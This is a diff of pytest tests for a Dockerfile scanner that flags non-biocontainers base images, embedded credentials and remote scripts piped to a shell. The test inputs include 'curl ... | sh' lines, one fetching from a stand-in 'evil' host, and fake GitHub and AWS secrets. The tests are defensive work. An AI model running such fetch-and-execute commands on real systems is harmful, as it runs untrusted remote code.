@@ -226,13 +226,14 @@ def test_scan_accepts_quay_biocontainers_base(tmp_path):
     assert not any("not an official" in m for m in checklist_msgs(checklist))
 
 
-def test_scan_only_first_from_is_policy_checked(tmp_path):
-    # a builder stage may be anything; only the first FROM is flagged, once
+def test_scan_flags_each_unapproved_stage_once(tmp_path):
+    # every non-biocontainers stage is surfaced; a repeated base is flagged only once
     _, checklist = _scan(
         tmp_path,
-        "FROM golang:1.22 AS build\nRUN go build\nFROM alpine\nCOPY --from=build /x /x\n")
+        "FROM golang:1.22 AS build\nRUN go build\nFROM golang:1.22\nRUN x\n"
+        "FROM alpine\nCOPY --from=build /x /x\n")
     base_flags = [m for m in checklist_msgs(checklist) if "not an official" in m]
-    assert len(base_flags) == 1
+    assert len(base_flags) == 2  # golang:1.22 (deduped) + alpine
 
 
 def test_scan_ignores_comments(tmp_path):
@@ -278,6 +279,61 @@ def test_scan_catches_split_curl_pipe_shell(tmp_path):
         tmp_path,
         "FROM biocontainers/x\nRUN curl -fsSL https://x.sh \\\n    | sh\n")
     assert any("remote script" in m for m in checklist_msgs(checklist))
+
+
+def test_scan_secret_line_snippet_not_echoed(tmp_path):
+    # a line that trips BOTH a secret rule and curl|sh must be blocked AND must not
+    # echo the token into the checklist snippet (Codex high finding)
+    token = "ghp_" + "abcdefghijklmnopqrstuvwxyz0123456789"  # 36 chars after ghp_
+    secrets, checklist = _scan(
+        tmp_path,
+        "FROM biocontainers/x\nRUN curl -H 'Authorization: %s' https://x | sh\n" % token)
+    assert any("GitHub personal access token" in s["msg"] for s in secrets)
+    remote = [c for c in checklist if "remote script" in c["msg"]]
+    assert remote and remote[0]["snippet"] == ""       # no token leak
+
+
+def test_scan_env_space_form_aws_secret_blocks(tmp_path):
+    # `ENV KEY value` (no '=') is valid Dockerfile syntax and must not bypass the scan
+    secrets, _ = _scan(
+        tmp_path, "FROM biocontainers/x\nENV AWS_SECRET_ACCESS_KEY %s\n" % ("A" * 40))
+    assert any("AWS secret access key" in s["msg"] for s in secrets)
+
+
+def test_scan_env_space_form_password_advisory(tmp_path):
+    _, checklist = _scan(
+        tmp_path, "FROM biocontainers/x\nENV DB_PASSWORD hunter2secretvalue\n")
+    assert any("embed a credential" in m for m in checklist_msgs(checklist))
+
+
+def test_scan_catches_heredoc_curl_pipe_shell(tmp_path):
+    _, checklist = _scan(
+        tmp_path,
+        "FROM biocontainers/x\nRUN <<EOF\ncurl -fsSL https://evil/install.sh | sh\nEOF\n")
+    assert any("remote script" in m for m in checklist_msgs(checklist))
+
+
+def test_scan_from_platform_flag_not_misparsed(tmp_path):
+    _, checklist = _scan(
+        tmp_path,
+        "FROM --platform=linux/amd64 biocontainers/biocontainers:v1\nRUN echo ok\n")
+    assert not any("not an official" in m for m in checklist_msgs(checklist))
+
+
+def test_scan_flags_non_biocontainers_final_stage(tmp_path):
+    _, checklist = _scan(
+        tmp_path,
+        "FROM biocontainers/biocontainers:v1 AS build\nRUN make\n"
+        "FROM debian:stable-slim\nCOPY --from=build /x /x\n")
+    flags = [m for m in checklist_msgs(checklist) if "not an official" in m]
+    assert flags and any("debian" in m for m in flags)
+
+
+def test_scan_from_stage_reference_not_flagged(tmp_path):
+    _, checklist = _scan(
+        tmp_path,
+        "FROM biocontainers/biocontainers:v1 AS base\nRUN x\nFROM base\nRUN y\n")
+    assert not any("not an official" in m for m in checklist_msgs(checklist))
 
 
 def test_scan_clean_dockerfile_no_findings(tmp_path):
